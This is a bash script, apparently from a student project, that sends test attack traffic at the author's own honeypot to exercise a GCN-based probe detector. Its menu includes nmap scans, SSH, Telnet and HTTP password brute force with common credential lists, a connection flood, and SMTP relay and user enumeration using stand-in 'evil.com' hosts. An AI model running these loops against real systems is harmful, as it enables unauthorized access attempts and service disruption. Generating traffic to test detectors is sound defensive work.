#!/bin/bash
# ============================================================
# Attack Demo Script — run from your laptop
# Usage: bash attack_demo.sh <AWS_PUBLIC_IP>
# Requires: nmap, nc/ncat, ssh, telnet
# ============================================================
TARGET="${1:-}"
if [ -z "$TARGET" ]; then
    echo "Usage: bash attack_demo.sh <AWS_PUBLIC_IP>"
    exit 1
fi

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log(){ echo -e "${CYAN}[*]${NC} $1"; }
ok(){  echo -e "${GREEN}[✓]${NC} $1"; }
warn(){ echo -e "${YELLOW}[!]${NC} $1"; }

echo -e "${RED}"
echo "═══════════════════════════════════════════════════════"
echo "   PROBE ATTACK DEMO SUITE"
echo "   Target: $TARGET"
echo "═══════════════════════════════════════════════════════"
echo -e "${NC}"

# ── 1: Service/version scan ──────────────────────────────────
attack_service_scan(){
    log "Service scan → Multi-Service Probe node"
    nmap -sV -T3 -p 22,2222,2223,80,443 $TARGET 2>/dev/null || \
    nmap -T3 -p 22,2222,2223,80,443 $TARGET
    ok "Service scan done"
}

# ── 2: SSH brute force ───────────────────────────────────────
attack_ssh_brute(){
    log "SSH brute force on Cowrie (port 2222) → Brute Force rule"
    for user in root admin ubuntu pi oracle guest; do
        for pass in password 123456 admin root toor letmein; do
            ssh -o StrictHostKeyChecking=no \
                -o ConnectTimeout=2 \
                -o PasswordAuthentication=yes \
                -o PreferredAuthentications=password \
                -o LogLevel=quiet \
                -p 2222 \
                ${user}@${TARGET} exit 2>/dev/null &
            sleep 0.15
        done
    done
    wait
    ok "SSH brute force done"
}

# ── 3: Telnet brute force ────────────────────────────────────
attack_telnet_brute(){
    log "Telnet brute force on Cowrie (port 2223) → Multi-Service + Brute Force"
    for user in root admin guest operator; do
        for pass in password admin 123456 root; do
            (
                sleep 0.8
                echo "$user"
                sleep 0.4
                echo "$pass"
                sleep 0.4
                echo "exit"
            ) | telnet $TARGET 2223 2>/dev/null &
            sleep 0.3
        done
    done
    wait
    ok "Telnet brute force done"
}

# ── 4: Rapid connection flood ─────────────────────────────────
attack_rapid_conn(){
    log "Rapid connection flood → Rapid Connections rule"
    for i in $(seq 1 30); do
        nc -z -w1 $TARGET 2222 2>/dev/null &
        nc -z -w1 $TARGET 80   2>/dev/null &
        nc -z -w1 $TARGET 2223 2>/dev/null &
        sleep 0.05
    done
    wait
    ok "Rapid flood done"
}

# ── 5: OS fingerprint scan ───────────────────────────────────
attack_os_scan(){
    log "OS fingerprint scan → Aggressive detection"
    nmap -A -T4 -p 22,2222,80 $TARGET 2>/dev/null || \
    nmap -T4 -p 22,2222,80 $TARGET
    ok "OS scan done"
}

# ── 6: Normal access sim ─────────────────────────────────────
normal_access(){
    log "Normal access sim"
    for wave in 1 2 3; do
        log "  Wave $wave/3..."
        for port in 2222 2223 80; do
            nc -z -w1 $TARGET $port 2>/dev/null &
        done
        sleep 1
        ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
            -o PasswordAuthentication=yes \
            -o PreferredAuthentications=password \
            -o LogLevel=quiet \
            -p 2222 root@${TARGET} exit 2>/dev/null &
        sleep 2
    done
    wait
    ok "Normal access done"
}

# ── 7: HTTP login brute force ─────────────────────────────────
attack_http_login_brute(){
    log "HTTP login brute force → POST /login attack"
    for user in admin root administrator user guest superuser operator; do
        for pass in password 123456 admin admin123 root pass qwerty letmein; do
            curl -s -o /dev/null \
                --connect-timeout 3 \
                -X POST "http://$TARGET/" \
                -d "username=${user}&password=${pass}" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -H "User-Agent: Mozilla/5.0 zgrab/0.x" \
                2>/dev/null &
            sleep 0.1
        done
    done
    wait
    ok "HTTP login brute force done"
}

# ── 8: Normal SMTP send (legitimate mail simulation) ─────────
smtp_normal(){
    log "Normal SMTP send → legitimate mail pattern (NORMAL label expected)"
    (
        sleep 0.3; echo "EHLO mail.annauniv.edu"
        sleep 0.4; echo "MAIL FROM:<kirthickkumarkk2@gmail.com>"
        sleep 0.4; echo "RCPT TO:<admin@prod-server-01.local>"
        sleep 0.4; echo "DATA"
        sleep 0.3; echo "From: kirthickkumarkk2@gmail.com"
        echo "To: admin@prod-server-01.local"
        echo "Subject: Project Submission — GCN Probe Detector"
        echo ""
        echo "Dear Admin,"
        echo ""
        echo "Please find attached the final project report for"
        echo "the GCN-based network probe detection system."
        echo ""
        echo "Regards,"
        echo "Kirthick Kumar"
        sleep 0.3; echo "."
        sleep 0.4; echo "QUIT"
    ) | nc -w8 $TARGET 2525
    ok "Normal SMTP send done"
}

# ── 9: SMTP probe attack (zero-day pattern) ───────────────────
smtp_attack(){
    log "SMTP probe attack → Zero-Day detection (orange node expected)"
    log "Sending rapid relay attempts + VRFY enumeration..."

    # Multiple rapid connections with suspicious commands
    for i in $(seq 1 6); do
        (
            sleep 0.1
            printf "EHLO attacker-$(hostname).evil.com\r\n"
            sleep 0.2
            printf "VRFY root\r\n"
            sleep 0.2
            printf "MAIL FROM:<spam@evil-$(echo $RANDOM).com>\r\n"
            sleep 0.2
            printf "RCPT TO:<root@external-target.com>\r\n"
            sleep 0.2
            printf "RCPT TO:<admin@external-target.com>\r\n"
            sleep 0.2
            printf "EXPN admins\r\n"
            sleep 0.2
            printf "QUIT\r\n"
        ) | nc -w5 $TARGET 2525 2>/dev/null &
        sleep 0.2
    done
    wait
    ok "SMTP attack done — check dashboard for orange Zero-Day node"
}

# ── MENU ──────────────────────────────────────────────────────
echo "Select attack:"
echo "  1)  Service scan               → Multi-Service Probe"
echo "  2)  SSH brute force (2222)     → Brute Force rule"
echo "  3)  Telnet brute force (2223)  → Brute Force + Telnet node"
echo "  4)  Rapid connection flood     → Rapid Connections rule"
echo "  5)  OS fingerprint scan        → Aggressive detection"
echo "  6)  Normal access sim          → Normal access pattern"
echo "  7)  HTTP login brute force     → POST /login attack"
echo "  8)  Normal SMTP send           → Legitimate mail (NORMAL)"
echo "  9)  SMTP probe attack          → Zero-Day detection (orange)"
echo ""
read -p "Choice [1-9]: " c

case $c in
    1) attack_service_scan ;;
    2) attack_ssh_brute ;;
    3) attack_telnet_brute ;;
    4) attack_rapid_conn ;;
    5) attack_os_scan ;;
    6) normal_access ;;
    7) attack_http_login_brute ;;
    8) smtp_normal ;;
    9) smtp_attack ;;
    *) echo "Invalid choice"; exit 1 ;;
esac